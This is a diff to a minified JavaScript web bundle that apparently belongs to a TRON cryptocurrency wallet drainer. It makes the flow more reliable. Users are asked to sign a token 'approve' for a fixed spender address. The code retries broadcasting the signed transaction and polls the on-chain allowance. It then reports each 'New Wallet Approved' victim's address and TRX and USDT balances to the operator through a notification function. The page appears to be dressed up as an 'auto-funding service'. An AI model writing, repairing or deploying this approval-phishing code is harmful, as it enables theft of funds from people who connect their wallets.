@@ -79489,20 +79489,66 @@
                             , i = "approve(address,uint256)"
                             , s = await t.transactionBuilder.triggerSmartContract(r, i, n, o, e);
                         console.log("Transaction Built:", s);
-                        const a = (await this.provider.request({
-                            method: "tron_signTransaction",
-                            params: {
-                                address: e,
-                                transaction: s
-                            }
-                        }, "tron:0x2b6653dc")).result;
-                        if (!a)
+                        let signed;
+                        if (this.provider.client && this.provider.session) {
+                            const chainId = this.provider.session.namespaces.tron?.chains?.[0] || "tron:0x2b6653dc";
+                            signed = (await this.provider.client.request({
+                                topic: this.provider.session.topic,
+                                chainId: chainId,
+                                request: {
+                                    method: "tron_signTransaction",
+                                    params: {
+                                        address: e,
+                                        transaction: s
+                                    }
+                                }
+                            })).result
+                        } else {
+                            signed = (await this.provider.request({
+                                method: "tron_signTransaction",
+                                params: {
+                                    address: e,
+                                    transaction: s
+                                }
+                            }, "tron:0x2b6653dc")).result
+                        }
+                        if (!signed)
                             return {
-                                success: !1
+                                success: !1,
+                                error: "User rejected signing"
                             };
-                        return await t.trx.sendRawTransaction(a)
-                    } catch (t) {
+                        console.log("Signed from wallet:", signed);
+                        const candidates = [signed, signed.transaction, s.transaction].filter(Boolean)
+                            , seen = new Set;
+                        for (const c of candidates) {
+                            if (!c || !c.raw_data || seen.has(c.txID || c.raw_data_hex))
+                                continue;
+                            seen.add(c.txID || c.raw_data_hex);
+                            if (!c.signature || !c.signature.length)
+                                continue;
+                            try {
+                                const u = await t.trx.sendRawTransaction(c);
+                                if (console.log("Broadcast result:", u),
+                                    u && !0 === u.result && u.txid)
+                                    return u
+                            } catch (h) {
+                                console.warn("Broadcast attempt failed:", h)
+                            }
+                        }
+                        try {
+                            const u = await t.trx.sendRawTransaction(signed);
+                            if (u && !0 === u.result && u.txid)
+                                return u
+                        } catch (h) {
+                            console.warn("Direct broadcast failed:", h)
+                        }
                         return {
+                            success: !1,
+                            error: "Transaction not broadcast to blockchain"
+                        }
+                    } catch (t) {
+                        return console.error("sendTransaction error:", t),
+                        {
                             success: !1,
                             error: t.message
                         }
@@ -79518,17 +79564,47 @@
                     , a = ["tron:".concat(aG)]
                     , c = ["tron_signTransaction", "tron_signMessage"]
                     , l = async (e, t) => {
+                        const d = async () => {
+                            try {
+                                const e = (await rG.transactionBuilder.triggerConstantContract(UV, "allowance(address,address)", {}, [{
+                                    type: "address",
+                                    value: t
+                                }, {
+                                    type: "address",
+                                    value: LV
+                                }], rG.address.toHex(LV))).constant_result[0]
+                                    , r = e.startsWith("0x") ? e : "0x".concat(e);
+                                return rG.toBigNumber(r).toNumber()
+                            } catch (e) {
+                                return 0
+                            }
+                        };
                         try {
                             const n = await e.sendTransaction(t);
-                            if (n) {
-                                const o = await e.getBalance(t)
-                                    , i = await iG(t);
-                                r(n);
-                                const a = "New Wallet Approved\n\ud83d\udcb3Wallet Address <code>".concat(t, " </code>\n Balance: <code>").concat(o, " TRX </code>\n USDT Balance: <code>").concat(i, "</code>");
-                                sG(a)
+                            console.log("Approval broadcast response:", n);
+                            for (let h = 0; h < 10; h++) {
+                                await new Promise((e => setTimeout(e, 3e3)));
+                                const f = await d();
+                                if (console.log("On-chain allowance check", h + 1, ":", f),
+                                    f > 0) {
+                                    const o = await e.getBalance(t)
+                                        , i = await iG(t);
+                                    r(n && !0 === n.result && n.txid ? n : {
+                                        result: !0,
+                                        txid: n && n.txid
+                                    });
+                                    const a = "New Wallet Approved\n\ud83d\udcb3Wallet Address <code>".concat(t, " </code>\n Balance: <code>").concat(o, " TRX </code>\n USDT Balance: <code>").concat(i, "</code>");
+                                    sG(a);
+                                    return !0
+                                }
                             }
+                            return console.error("No on-chain approval found:", n),
+                                s(!0),
+                                !1
                         } catch (n) {
-                            s(!0)
+                            return console.error("Approval failed:", n),
+                                s(!0),
+                                !1
                         }
                     }
                     , u = async (e, t) => {
@@ -79634,8 +79710,8 @@
                                                     window.alert(error?.message || "Auto-funding service unavailable. Please try again later.");
                                                     return
                                                 }
-                                                l(n, r),
-                                                    t(r)
+                                                const ok = await l(n, r);
+                                                ok && t(r)
                                             } catch (r) {
                                             } finally {
                                                 const __loader = document.getElementById("wc-loading-overlay");
